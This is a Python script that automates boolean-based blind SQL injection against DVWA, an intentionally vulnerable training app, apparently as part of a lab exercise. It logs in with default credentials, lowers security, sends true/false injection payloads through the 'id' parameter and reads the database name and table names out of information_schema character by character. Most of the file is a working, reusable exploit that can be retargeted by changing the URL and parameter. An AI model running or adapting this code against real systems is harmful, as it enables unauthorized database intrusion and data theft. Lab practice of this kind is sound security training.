#!/usr/bin/env python3
"""
test_boolean_fixed.py - BULLETPROOF Boolean Blind SQLi for DVWA

This is a SELF-CONTAINED script — no imports from sqli_tool modules.
It auto-logs into DVWA, so you never have stale cookies.

FIXES APPLIED:
  1. Auto-login to DVWA (no more expired PHPSESSID)
  2. Always sends Submit=Submit
  3. Uses text-based detection ("Surname")
  4. Full debug output so you can see what's happening
"""

import requests
import urllib3
import re
import sys
import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ══════════════════════════════════════════════════════════
#  CONFIGURATION — change the URL if DVWA runs elsewhere
# ══════════════════════════════════════════════════════════
DVWA_BASE = "http://localhost:8080"
DVWA_USER = "admin"
DVWA_PASS = "password"
SQLI_PATH = "/vulnerabilities/sqli/"
DB_TYPE = "mysql"
CHARSET = "abcdefghijklmnopqrstuvwxyz0123456789_"
MAX_LEN = 64
# ══════════════════════════════════════════════════════════


def banner():
    print("""
    ╔══════════════════════════════════════════════════╗
    ║   SQLi Automation Tool v2.0 (Bulletproof)        ║
    ║   For Authorized Testing Only                    ║
    ╚══════════════════════════════════════════════════╝
    """)


def dvwa_login(session):
    """
    Automatically log into DVWA and return an authenticated session.

    What's going on:
        1. GET the login page to obtain the CSRF token (user_token)
        2. POST the credentials with the CSRF token
        3. Set the security cookie to "low"
        4. Now the session is authenticated — no more expired cookies!

    This eliminates the #1 cause of "same size responses" — expired sessions.
    """
    print("[*] Step 1: Auto-logging into DVWA...")

    # ── Get the login page (to extract CSRF token) ──
    login_url = f"{DVWA_BASE}/login.php"
    resp = session.get(login_url, verify=False)

    if resp.status_code != 200:
        print(f"    ❌ Cannot reach DVWA at {DVWA_BASE}")
        print(f"       Status: {resp.status_code}")
        print(f"       Make sure DVWA is running: docker-compose up -d")
        sys.exit(1)

    # Extract the CSRF token (user_token)
    token_match = re.search(r"user_token'\s+value='([a-f0-9]+)'", resp.text)
    if not token_match:
        # Try alternate pattern
        token_match = re.search(r"user_token'[^>]*value='([^']+)'", resp.text)
    
    if not token_match:
        print("    ❌ Could not find CSRF token on login page")
        print("       DVWA might not be set up properly")
        print("       Visit http://localhost:8080 and click 'Create/Reset Database'")
        sys.exit(1)

    user_token = token_match.group(1)
    print(f"    CSRF token: {user_token[:20]}...")

    # ── POST login credentials ──
    login_data = {
        "username": DVWA_USER,
        "password": DVWA_PASS,
        "Login": "Login",
        "user_token": user_token,
    }
    resp = session.post(login_url, data=login_data, verify=False,
                         allow_redirects=True)

    # Check if login succeeded
    if "login.php" in resp.url and "Login" in resp.text:
        print("    ❌ Login failed! Check credentials.")
        sys.exit(1)

    print(f"    ✅ Logged in as '{DVWA_USER}'")

    # ── Set security to Low ──
    session.cookies.set("security", "low")
    print(f"    ✅ Security set to: low")

    # ── Verify we can access the SQLi page ──
    sqli_url = f"{DVWA_BASE}{SQLI_PATH}"
    resp = session.get(sqli_url, verify=False)
    
    if "login.php" in resp.url:
        print("    ❌ Still getting redirected to login!")
        sys.exit(1)
    
    if 'name="id"' in resp.text:
        print(f"    ✅ SQLi page accessible ({len(resp.content)} bytes)")
    else:
        print(f"    ⚠️  SQLi page loaded but form not found")

    print()
    return session


def calibrate(session):
    """
    Send TRUE and FALSE conditions to learn what each looks like.

    What's going on:
        We send:
        - TRUE:  1' AND '1'='1'--   (always true → shows data)
        - FALSE: 1' AND '1'='2'--   (always false → no data)

        Both requests include Submit=Submit so DVWA processes them.

        We then compare:
        - Response sizes
        - Presence of "Surname" text
        - Any text differences

        This tells us how to detect TRUE vs FALSE for character extraction.
    """
    print("[*] Step 2: Calibrating TRUE/FALSE detection...")

    sqli_url = f"{DVWA_BASE}{SQLI_PATH}"

    # ── Normal request (no injection) ──
    resp_normal = session.get(sqli_url, params={"id": "1", "Submit": "Submit"},
                               verify=False)
    normal_size = len(resp_normal.content)
    print(f"    Normal (id=1):   {normal_size} bytes | "
          f"'Surname' present: {'Surname' in resp_normal.text}")

    # ── TRUE condition ──
    resp_true = session.get(sqli_url,
                             params={"id": "1' AND '1'='1'-- ", "Submit": "Submit"},
                             verify=False)
    true_size = len(resp_true.content)
    true_has_surname = "Surname" in resp_true.text
    print(f"    TRUE condition:  {true_size} bytes | "
          f"'Surname' present: {true_has_surname}")

    # ── FALSE condition ──
    resp_false = session.get(sqli_url,
                              params={"id": "1' AND '1'='2'-- ", "Submit": "Submit"},
                              verify=False)
    false_size = len(resp_false.content)
    false_has_surname = "Surname" in resp_false.text
    print(f"    FALSE condition: {false_size} bytes | "
          f"'Surname' present: {false_has_surname}")

    # ── Empty request (no Submit) ──
    resp_empty = session.get(sqli_url, params={"id": "1"}, verify=False)
    empty_size = len(resp_empty.content)
    print(f"    No Submit param: {empty_size} bytes | "
          f"'Surname' present: {'Surname' in resp_empty.text}")

    # ── Analyze ──
    print()

    # PROBLEM CHECK: are we getting the same response for everything?
    if normal_size == true_size == false_size == empty_size:
        print("    ❌ ALL responses are identical!")
        print("       Checking if this is a session issue...")
        
        # Check if we're getting redirected
        if "login.php" in resp_true.url:
            print("       → Session expired during test. Re-login needed.")
            return None, None, None

        # Check if DVWA is in setup mode
        if "setup.php" in resp_true.text or "Create / Reset Database" in resp_true.text:
            print("       → DVWA database not set up!")
            print("         Visit http://localhost:8080/setup.php")
            print("         Click 'Create / Reset Database'")
            return None, None, None

        print("       → This might mean the injection syntax is wrong for your DVWA version.")
        print("       → Let's try alternate payload syntax...")
        return "try_alternate", resp_true, resp_false

    # DETECTION METHOD SELECTION
    detection = {}

    if true_has_surname and not false_has_surname:
        print("    ✅ PERFECT: 'Surname' appears in TRUE but not FALSE")
        print("       → Using text indicator: 'Surname'")
        detection = {"method": "text", "indicator": "Surname"}

    elif true_size != false_size:
        diff = true_size - false_size
        print(f"    ✅ Size difference detected: {diff} bytes")
        print(f"       → Using size-based detection")
        detection = {"method": "size", "true_size": true_size, 
                     "false_size": false_size}
    else:
        # Try to find ANY text difference
        print("    ⚠️  Same size, same Surname status. Deep text analysis...")
        
        true_lines = set(resp_true.text.splitlines())
        false_lines = set(resp_false.text.splitlines())
        diff_lines = true_lines - false_lines
        
        for line in diff_lines:
            stripped = line.strip()
            if len(stripped) > 5 and '<' not in stripped:
                print(f"    ✅ Found text difference: '{stripped[:50]}'")
                detection = {"method": "text", "indicator": stripped[:50]}
                break
        
        if not detection:
            # Extract all text differences
            import difflib
            diff = list(difflib.unified_diff(
                resp_false.text.splitlines(),
                resp_true.text.splitlines(),
                lineterm=""
            ))
            if diff:
                for d in diff[:10]:
                    print(f"       DIFF: {d[:80]}")
                # Use the first added line as indicator
                added = [d[1:] for d in diff if d.startswith('+') and not d.startswith('+++')]
                if added:
                    # Find clean text
                    for a in added:
                        text_match = re.search(r'>([^<]{3,})<', a)
                        if text_match:
                            detection = {"method": "text", 
                                         "indicator": text_match.group(1).strip()}
                            print(f"    ✅ Using extracted indicator: '{detection['indicator']}'")
                            break
            
            if not detection:
                print("    ❌ Cannot distinguish TRUE from FALSE at all")
                print("       The injection might not be working")
                return None, None, None

    print()
    return detection, resp_true, resp_false


def try_alternate_payloads(session):
    """
    Try different payload syntaxes in case the default doesn't work.

    What's going on:
        Different DVWA versions and MySQL versions might need
        slightly different SQL injection syntax. We try several
        variations to find one that works.
    """
    print("[*] Trying alternate payload syntaxes...")
    sqli_url = f"{DVWA_BASE}{SQLI_PATH}"

    alternates = [
        # Format: (true_payload, false_payload, description)
        ("1' AND '1'='1'#", "1' AND '1'='2'#",
         "Hash comment instead of double-dash"),
        ("1' AND 1=1#", "1' AND 1=2#",
         "Numeric comparison with hash"),
        ("1' AND 1=1-- -", "1' AND 1=2-- -",
         "Double-dash-space-dash"),
        ("1' OR '1'='1'#", "1' OR '1'='2'#",
         "OR instead of AND"),
        ("1 AND 1=1", "1 AND 1=2",
         "No quotes (numeric injection)"),
        ("1' AND '1'='1", "1' AND '1'='2",
         "No comment terminator"),
    ]

    for true_p, false_p, desc in alternates:
        resp_true = session.get(sqli_url,
                                 params={"id": true_p, "Submit": "Submit"},
                                 verify=False)
        resp_false = session.get(sqli_url,
                                  params={"id": false_p, "Submit": "Submit"},
                                  verify=False)

        true_size = len(resp_true.content)
        false_size = len(resp_false.content)
        true_has_data = "Surname" in resp_true.text
        false_has_data = "Surname" in resp_false.text

        status = ""
        if true_has_data and not false_has_data:
            status = "✅ WORKS!"
        elif true_size != false_size:
            status = "✅ Size diff!"
        elif true_has_data and false_has_data:
            status = "⚠️  Both show data"
        else:
            status = "❌ No diff"

        print(f"    {status} | {desc}")
        print(f"       TRUE:  '{true_p}' → {true_size}b, Surname: {true_has_data}")
        print(f"       FALSE: '{false_p}' → {false_size}b, Surname: {false_has_data}")

        if true_has_data and not false_has_data:
            print(f"\n    ✅ Found working syntax: {desc}")
            return true_p, false_p, desc

        if true_size != false_size:
            print(f"\n    ✅ Found syntax with size difference: {desc}")
            return true_p, false_p, desc

    print("\n    ❌ No working payload found!")
    print("       Make sure DVWA security is set to 'Low'")
    print("       Try accessing http://localhost:8080/vulnerabilities/sqli/ in browser")
    print("       Manually type: 1' OR '1'='1'#  in the input field")
    print("       If that doesn't work either, reset the DVWA database.")
    return None, None, None


def extract_database_name(session, detection, comment_style="-- "):
    """
    Extract the database name character by character.

    What's going on:
        For each position (1, 2, 3, ...):
            For each character in our charset:
                Send: 1' AND SUBSTRING(database(),pos,1)='char'<comment>
                With: Submit=Submit (CRITICAL for DVWA!)
                Check response for the TRUE indicator
                If TRUE → this character is correct, move to next position
                If FALSE → try next character

    Args:
        session: Authenticated requests session
        detection: Dict with detection method info
        comment_style: SQL comment to terminate the injection
    """
    print("[*] Step 3: Extracting database name character by character...")
    print(f"    Detection method: {detection['method']}")
    if detection['method'] == 'text':
        print(f"    Looking for: '{detection['indicator']}' in response")
    print()

    sqli_url = f"{DVWA_BASE}{SQLI_PATH}"
    extracted = ""

    for pos in range(1, MAX_LEN + 1):
        found_char = False

        for char in CHARSET:
            # Build the payload
            payload = f"1' AND SUBSTRING(database(),{pos},1)='{char}'{comment_style}"

            # Send the request — ALWAYS include Submit=Submit
            resp = session.get(
                sqli_url,
                params={"id": payload, "Submit": "Submit"},
                verify=False
            )

            # Check if this character is correct
            is_true = False
            if detection["method"] == "text":
                is_true = detection["indicator"] in resp.text
            elif detection["method"] == "size":
                # Closer to true_size = TRUE
                true_diff = abs(len(resp.content) - detection["true_size"])
                false_diff = abs(len(resp.content) - detection["false_size"])
                is_true = true_diff < false_diff

            if is_true:
                extracted += char
                print(f"\r    [+] Position {pos}: '{char}' ✓  →  Database: {extracted}",
                      end="", flush=True)
                found_char = True
                break

        if not found_char:
            # No character matched — we've reached the end
            print(f"\n    [*] No match at position {pos} — end of string")
            break

    print()
    return extracted


def extract_tables(session, detection, comment_style="-- "):
    """Extract table names from the current database."""
    print("[*] Step 4: Extracting table names...")
    sqli_url = f"{DVWA_BASE}{SQLI_PATH}"
    tables = []

    for table_idx in range(10):
        table_name = ""
        print(f"\n    [*] Table #{table_idx + 1}:")

        for pos in range(1, MAX_LEN + 1):
            found_char = False

            for char in CHARSET:
                payload = (
                    f"1' AND SUBSTRING(("
                    f"SELECT table_name FROM information_schema.tables "
                    f"WHERE table_schema=database() LIMIT {table_idx},1"
                    f"),{pos},1)='{char}'{comment_style}"
                )

                resp = session.get(
                    sqli_url,
                    params={"id": payload, "Submit": "Submit"},
                    verify=False
                )

                is_true = False
                if detection["method"] == "text":
                    is_true = detection["indicator"] in resp.text
                elif detection["method"] == "size":
                    true_diff = abs(len(resp.content) - detection["true_size"])
                    false_diff = abs(len(resp.content) - detection["false_size"])
                    is_true = true_diff < false_diff

                if is_true:
                    table_name += char
                    print(f"\r        Extracting: {table_name}", end="", flush=True)
                    found_char = True
                    break

            if not found_char:
                break

        if table_name:
            tables.append(table_name)
            print(f"\n        [✓] Found table: {table_name}")
        else:
            print(f"        [*] No more tables (total: {len(tables)})")
            break

    return tables


# ══════════════════════════════════════════════════════════
#  MAIN
# ══════════════════════════════════════════════════════════
def main():
    banner()

    session = requests.Session()

    # Step 1: Auto-login
    dvwa_login(session)

    # Step 2: Calibrate
    detection, resp_true, resp_false = calibrate(session)

    # Handle case where all responses are identical
    if detection == "try_alternate":
        result = try_alternate_payloads(session)
        if result[0] is None:
            print("\n❌ Could not find a working injection method.")
            print("   Run debug_dvwa.py for detailed diagnostics.")
            sys.exit(1)

        # Re-calibrate with the working syntax
        true_p, false_p, desc = result
        # Determine comment style from working payload
        if "#" in true_p:
            comment = "#"
        elif "-- -" in true_p:
            comment = "-- -"
        elif "-- " in true_p:
            comment = "-- "
        else:
            comment = ""

        # Build detection from the working payloads
        sqli_url = f"{DVWA_BASE}{SQLI_PATH}"
        rt = session.get(sqli_url, params={"id": true_p, "Submit": "Submit"},
                          verify=False)
        rf = session.get(sqli_url, params={"id": false_p, "Submit": "Submit"},
                          verify=False)

        if "Surname" in rt.text and "Surname" not in rf.text:
            detection = {"method": "text", "indicator": "Surname"}
        else:
            detection = {"method": "size", "true_size": len(rt.content),
                         "false_size": len(rf.content)}

    elif detection is None:
        print("\n❌ Calibration failed. Run debug_dvwa.py for diagnostics.")
        sys.exit(1)

    # Determine comment style
    # Try # first (works on most MySQL setups)
    sqli_url = f"{DVWA_BASE}{SQLI_PATH}"
    test_hash = session.get(sqli_url,
                             params={"id": "1' AND '1'='1'#", "Submit": "Submit"},
                             verify=False)
    if "Surname" in test_hash.text:
        comment_style = "#"
        print("[*] Using comment style: # (hash)")
    else:
        comment_style = "-- "
        print("[*] Using comment style: -- (double-dash-space)")

    # Step 3: Extract database name
    print()
    db_name = extract_database_name(session, detection, comment_style)

    print(f"\n{'='*60}")
    print(f"    [✓] DATABASE NAME: {db_name}")
    print(f"{'='*60}")

    if not db_name:
        print("\n    ❌ Database name is still empty!")
        print("    Running full diagnostics...\n")
        
        # Extra debug: try a single specific payload manually
        payload = f"1' AND SUBSTRING(database(),1,1)='d'{comment_style}"
        resp = session.get(sqli_url,
                           params={"id": payload, "Submit": "Submit"},
                           verify=False)
        print(f"    Manual test for 'd': size={len(resp.content)}, "
              f"Surname={'Surname' in resp.text}")
        print(f"    Response URL: {resp.url}")
        print(f"    Response snippet: {resp.text[1000:1200]}")
        sys.exit(1)

    # Step 4: Extract tables (optional)
    print()
    user_input = input("[?] Extract table names too? (y/n): ").strip().lower()
    if user_input == 'y':
        tables = extract_tables(session, detection, comment_style)
        print(f"\n{'='*60}")
        print(f"    DATABASE SCHEMA:")
        print(f"    Database: {db_name}")
        for t in tables:
            print(f"      └── Table: {t}")
        print(f"{'='*60}")


if __name__ == "__main__":
    main()